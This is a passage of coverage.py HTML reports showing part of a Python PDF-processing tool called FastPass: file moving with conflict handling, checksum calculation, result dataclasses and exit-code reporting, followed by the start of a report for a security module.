    <p class="pln"><span class="n"><a id="t389" href="#t389">389</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t390" href="#t390">390</a></span><span class="t"><span class="str">        D4a-D4e: Enhanced File Movement with Error Handling</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t391" href="#t391">391</a></span><span class="t"><span class="str">        Move processed file to final location</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t392" href="#t392">392</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t393" href="#t393">393</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t394" href="#t394">394</a></span><span class="t">        <span class="com"># D4a: Determine Final Output Path with Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t395" href="#t395">395</a></span><span class="t">        <span class="key">if</span> <span class="nam">output_dir</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t396" href="#t396">396</a></span><span class="t">            <span class="nam">final_path</span> <span class="op">=</span> <span class="nam">output_dir</span> <span class="op">/</span> <span class="nam">original_path</span><span class="op">.</span><span class="nam">name</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t397" href="#t397">397</a></span><span class="t">        <span class="key">else</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t398" href="#t398">398</a></span><span class="t">            <span class="com"># In-place modification</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t399" href="#t399">399</a></span><span class="t">            <span class="nam">final_path</span> <span class="op">=</span> <span class="nam">original_path</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t400" href="#t400">400</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t401" href="#t401">401</a></span><span class="t">        <span class="com"># D4b: Handle Filename Conflicts</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t402" href="#t402">402</a></span><span class="t">        <span class="key">if</span> <span class="nam">final_path</span><span class="op">.</span><span class="nam">exists</span><span class="op">(</span><span class="op">)</span> <span class="key">and</span> <span class="nam">final_path</span> <span class="op">!=</span> <span class="nam">original_path</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t403" href="#t403">403</a></span><span class="t">            <span class="com"># Generate unique name for output directory</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t404" href="#t404">404</a></span><span class="t">            <span class="nam">counter</span> <span class="op">=</span> <span class="num">1</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t405" href="#t405">405</a></span><span class="t">            <span class="nam">base</span> <span class="op">=</span> <span class="nam">final_path</span><span class="op">.</span><span class="nam">stem</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t406" href="#t406">406</a></span><span class="t">            <span class="nam">suffix</span> <span class="op">=</span> <span class="nam">final_path</span><span class="op">.</span><span class="nam">suffix</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t407" href="#t407">407</a></span><span class="t">            <span class="key">while</span> <span class="nam">final_path</span><span class="op">.</span><span class="nam">exists</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t408" href="#t408">408</a></span><span class="t">                <span class="nam">final_path</span> <span class="op">=</span> <span class="nam">final_path</span><span class="op">.</span><span class="nam">parent</span> <span class="op">/</span> <span class="fst">f"</span><span class="op">{</span><span class="nam">base</span><span class="op">}</span><span class="fst">_</span><span class="op">{</span><span class="nam">counter</span><span class="op">}</span><span class="op">{</span><span class="nam">suffix</span><span class="op">}</span><span class="fst">"</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t409" href="#t409">409</a></span><span class="t">                <span class="nam">counter</span> <span class="op">+=</span> <span class="num">1</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t410" href="#t410">410</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t411" href="#t411">411</a></span><span class="t">        <span class="com"># D4c: Atomic Move with Error Handling</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t412" href="#t412">412</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t413" href="#t413">413</a></span><span class="t">            <span class="com"># Ensure target directory exists</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t414" href="#t414">414</a></span><span class="t">            <span class="nam">final_path</span><span class="op">.</span><span class="nam">parent</span><span class="op">.</span><span class="nam">mkdir</span><span class="op">(</span><span class="nam">parents</span><span class="op">=</span><span class="key">True</span><span class="op">,</span> <span class="nam">exist_ok</span><span class="op">=</span><span class="key">True</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t415" href="#t415">415</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t416" href="#t416">416</a></span><span class="t">            <span class="com"># Atomic move</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t417" href="#t417">417</a></span><span class="t">            <span class="nam">shutil</span><span class="op">.</span><span class="nam">move</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">temp_output</span><span class="op">)</span><span class="op">,</span> <span class="nam">str</span><span class="op">(</span><span class="nam">final_path</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t418" href="#t418">418</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t419" href="#t419">419</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t420" href="#t420">420</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Failed to move file to final location: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t421" href="#t421">421</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t422" href="#t422">422</a></span><span class="t">        <span class="com"># D4d: Update File Permissions</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t423" href="#t423">423</a></span><span class="t">        <span class="nam">final_path</span><span class="op">.</span><span class="nam">chmod</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">config</span><span class="op">[</span><span class="str">'secure_permissions'</span><span class="op">]</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t424" href="#t424">424</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t425" href="#t425">425</a></span><span class="t">        <span class="key">return</span> <span class="nam">final_path</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t426" href="#t426">426</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t427" href="#t427">427</a></span><span class="t">    <span class="key">def</span> <span class="nam">_calculate_checksum</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="nam">str</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t428" href="#t428">428</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t429" href="#t429">429</a></span><span class="t"><span class="str">        D4e: Generate File Checksum</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t430" href="#t430">430</a></span><span class="t"><span class="str">        Calculate SHA256 checksum for file integrity</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t431" href="#t431">431</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t432" href="#t432">432</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t433" href="#t433">433</a></span><span class="t">            <span class="key">return</span> <span class="nam">hashlib</span><span class="op">.</span><span class="nam">sha256</span><span class="op">(</span><span class="nam">file_path</span><span class="op">.</span><span class="nam">read_bytes</span><span class="op">(</span><span class="op">)</span><span class="op">)</span><span class="op">.</span><span class="nam">hexdigest</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t434" href="#t434">434</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t435" href="#t435">435</a></span><span class="t">            <span class="key">return</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t436" href="#t436">436</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t437" href="#t437">437</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t438" href="#t438">438</a></span><span class="t"><span class="op">@</span><span class="nam">dataclass</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t439" href="#t439">439</a></span><span class="t"><span class="key">class</span> <span class="nam">FileProcessingResult</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t440" href="#t440">440</a></span><span class="t">    <span class="str">"""Result of processing a single file"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t441" href="#t441">441</a></span><span class="t">    <span class="nam">original_path</span><span class="op">:</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t442" href="#t442">442</a></span><span class="t">    <span class="nam">final_path</span><span class="op">:</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t443" href="#t443">443</a></span><span class="t">    <span class="nam">operation</span><span class="op">:</span> <span class="nam">str</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t444" href="#t444">444</a></span><span class="t">    <span class="nam">password_used</span><span class="op">:</span> <span class="nam">bool</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t445" href="#t445">445</a></span><span class="t">    <span class="nam">checksum</span><span class="op">:</span> <span class="nam">Optional</span><span class="op">[</span><span class="nam">str</span><span class="op">]</span> <span class="op">=</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t446" href="#t446">446</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t447" href="#t447">447</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t448" href="#t448">448</a></span><span class="t"><span class="op">@</span><span class="nam">dataclass</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t449" href="#t449">449</a></span><span class="t"><span class="key">class</span> <span class="nam">FileProcessingError</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t450" href="#t450">450</a></span><span class="t">    <span class="str">"""Error during file processing"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t451" href="#t451">451</a></span><span class="t">    <span class="nam">path</span><span class="op">:</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t452" href="#t452">452</a></span><span class="t">    <span class="nam">message</span><span class="op">:</span> <span class="nam">str</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t453" href="#t453">453</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t454" href="#t454">454</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t455" href="#t455">455</a></span><span class="t"><span class="key">class</span> <span class="nam">ResultsReporter</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t456" href="#t456">456</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t457" href="#t457">457</a></span><span class="t"><span class="str">    Results reporting and exit code determination</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t458" href="#t458">458</a></span><span class="t"><span class="str">    Maps to Section E4a-E5d from flowchart</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t459" href="#t459">459</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t460" href="#t460">460</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t461" href="#t461">461</a></span><span class="t">    <span class="key">def</span> <span class="nam">__init__</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">logger</span><span class="op">:</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Logger</span><span class="op">,</span> <span class="nam">start_time</span><span class="op">:</span> <span class="nam">datetime</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t462" href="#t462">462</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span> <span class="op">=</span> <span class="nam">logger</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t463" href="#t463">463</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">start_time</span> <span class="op">=</span> <span class="nam">start_time</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t464" href="#t464">464</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t465" href="#t465">465</a></span><span class="t">    <span class="key">def</span> <span class="nam">generate_report</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">processing_results</span><span class="op">:</span> <span class="nam">Dict</span><span class="op">)</span> <span class="op">-></span> <span class="nam">int</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t466" href="#t466">466</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t467" href="#t467">467</a></span><span class="t"><span class="str">        E4a-E5d: Report generation and exit code determination</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t468" href="#t468">468</a></span><span class="t"><span class="str">        Generate comprehensive report and determine exit code</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t469" href="#t469">469</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t470" href="#t470">470</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t471" href="#t471">471</a></span><span class="t">        <span class="com"># E1a-E1e: Calculate Processing Metrics</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t472" href="#t472">472</a></span><span class="t">        <span class="nam">end_time</span> <span class="op">=</span> <span class="nam">datetime</span><span class="op">.</span><span class="nam">now</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t473" href="#t473">473</a></span><span class="t">        <span class="nam">duration</span> <span class="op">=</span> <span class="nam">end_time</span> <span class="op">-</span> <span class="nam">self</span><span class="op">.</span><span class="nam">start_time</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t474" href="#t474">474</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t475" href="#t475">475</a></span><span class="t">        <span class="nam">successful_files</span> <span class="op">=</span> <span class="nam">processing_results</span><span class="op">[</span><span class="str">'successful_files'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t476" href="#t476">476</a></span><span class="t">        <span class="nam">failed_files</span> <span class="op">=</span> <span class="nam">processing_results</span><span class="op">[</span><span class="str">'failed_files'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t477" href="#t477">477</a></span><span class="t">        <span class="nam">total_files</span> <span class="op">=</span> <span class="nam">processing_results</span><span class="op">[</span><span class="str">'total_files'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t478" href="#t478">478</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t479" href="#t479">479</a></span><span class="t">        <span class="com"># E4b-E4d: Generate Report</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t480" href="#t480">480</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">_print_results_summary</span><span class="op">(</span><span class="nam">successful_files</span><span class="op">,</span> <span class="nam">failed_files</span><span class="op">,</span> <span class="nam">total_files</span><span class="op">,</span> <span class="nam">duration</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t481" href="#t481">481</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t482" href="#t482">482</a></span><span class="t">        <span class="com"># E5a-E5d: Exit Code Determination</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t483" href="#t483">483</a></span><span class="t">        <span class="key">return</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_determine_exit_code</span><span class="op">(</span><span class="nam">successful_files</span><span class="op">,</span> <span class="nam">failed_files</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t484" href="#t484">484</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t485" href="#t485">485</a></span><span class="t">    <span class="key">def</span> <span class="nam">_print_results_summary</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">successful_files</span><span class="op">:</span> <span class="nam">List</span><span class="op">,</span> <span class="nam">failed_files</span><span class="op">:</span> <span class="nam">List</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t486" href="#t486">486</a></span><span class="t">                             <span class="nam">total_files</span><span class="op">:</span> <span class="nam">int</span><span class="op">,</span> <span class="nam">duration</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t487" href="#t487">487</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t488" href="#t488">488</a></span><span class="t"><span class="str">        E4b-E4e: Print comprehensive results summary</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t489" href="#t489">489</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t490" href="#t490">490</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t491" href="#t491">491</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">\nFastPass Processing Complete</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t492" href="#t492">492</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="op">{</span><span class="str">'='</span> <span class="op">*</span> <span class="num">40</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t493" href="#t493">493</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Total files processed: </span><span class="op">{</span><span class="nam">total_files</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t494" href="#t494">494</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Successful: </span><span class="op">{</span><span class="nam">len</span><span class="op">(</span><span class="nam">successful_files</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t495" href="#t495">495</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Failed: </span><span class="op">{</span><span class="nam">len</span><span class="op">(</span><span class="nam">failed_files</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t496" href="#t496">496</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Processing time: </span><span class="op">{</span><span class="nam">duration</span><span class="op">.</span><span class="nam">total_seconds</span><span class="op">(</span><span class="op">)</span><span class="op">:</span><span class="fst">.2f</span><span class="op">}</span><span class="fst"> seconds</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t497" href="#t497">497</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t498" href="#t498">498</a></span><span class="t">        <span class="key">if</span> <span class="nam">successful_files</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t499" href="#t499">499</a></span><span class="t">            <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">\nSuccessful files:</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t500" href="#t500">500</a></span><span class="t">            <span class="key">for</span> <span class="nam">result</span> <span class="key">in</span> <span class="nam">successful_files</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t501" href="#t501">501</a></span><span class="t">                <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">  SUCCESS: </span><span class="op">{</span><span class="nam">result</span><span class="op">.</span><span class="nam">original_path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t502" href="#t502">502</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t503" href="#t503">503</a></span><span class="t">        <span class="key">if</span> <span class="nam">failed_files</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t504" href="#t504">504</a></span><span class="t">            <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">\nFailed files:</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t505" href="#t505">505</a></span><span class="t">            <span class="key">for</span> <span class="nam">error</span> <span class="key">in</span> <span class="nam">failed_files</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t506" href="#t506">506</a></span><span class="t">                <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">  FAILED: </span><span class="op">{</span><span class="nam">error</span><span class="op">.</span><span class="nam">path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">error</span><span class="op">.</span><span class="nam">message</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t507" href="#t507">507</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t508" href="#t508">508</a></span><span class="t">    <span class="key">def</span> <span class="nam">_determine_exit_code</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">successful_files</span><span class="op">:</span> <span class="nam">List</span><span class="op">,</span> <span class="nam">failed_files</span><span class="op">:</span> <span class="nam">List</span><span class="op">)</span> <span class="op">-></span> <span class="nam">int</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t509" href="#t509">509</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t510" href="#t510">510</a></span><span class="t"><span class="str">        E5a-E5d: Exit Code Determination</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t511" href="#t511">511</a></span><span class="t"><span class="str">        Determine appropriate exit code based on results</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t512" href="#t512">512</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t513" href="#t513">513</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t514" href="#t514">514</a></span><span class="t">        <span class="nam">success_count</span> <span class="op">=</span> <span class="nam">len</span><span class="op">(</span><span class="nam">successful_files</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t515" href="#t515">515</a></span><span class="t">        <span class="nam">failure_count</span> <span class="op">=</span> <span class="nam">len</span><span class="op">(</span><span class="nam">failed_files</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t516" href="#t516">516</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t517" href="#t517">517</a></span><span class="t">        <span class="key">if</span> <span class="nam">failure_count</span> <span class="op">==</span> <span class="num">0</span> <span class="key">and</span> <span class="nam">success_count</span> <span class="op">></span> <span class="num">0</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t518" href="#t518">518</a></span><span class="t">            <span class="com"># E5b_Success: Exit Code 0</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t519" href="#t519">519</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">info</span><span class="op">(</span><span class="str">"All operations successful"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t520" href="#t520">520</a></span><span class="t">            <span class="key">return</span> <span class="num">0</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t521" href="#t521">521</a></span><span class="t">        <span class="key">elif</span> <span class="nam">success_count</span> <span class="op">></span> <span class="num">0</span> <span class="key">and</span> <span class="nam">failure_count</span> <span class="op">></span> <span class="num">0</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t522" href="#t522">522</a></span><span class="t">            <span class="com"># E5b_Mixed: Exit Code 1</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t523" href="#t523">523</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span><span class="str">"Some operations failed"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t524" href="#t524">524</a></span><span class="t">            <span class="key">return</span> <span class="num">1</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t525" href="#t525">525</a></span><span class="t">        <span class="key">else</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t526" href="#t526">526</a></span><span class="t">            <span class="com"># E5b_Failure: Exit Code 1</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t527" href="#t527">527</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">error</span><span class="op">(</span><span class="str">"All operations failed"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t528" href="#t528">528</a></span><span class="t">            <span class="key">return</span> <span class="num">1</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_ae6ae744f2ec6f26_pdf_handler_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_9d0a8317fb892e58___init___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_ce21df766c911d41_security_py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\core\security.py: 61%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\core\security.py</b>:
            <span class="pc_cov">61%</span>
        </h1>
        <aside id="help_panel_wrapper">
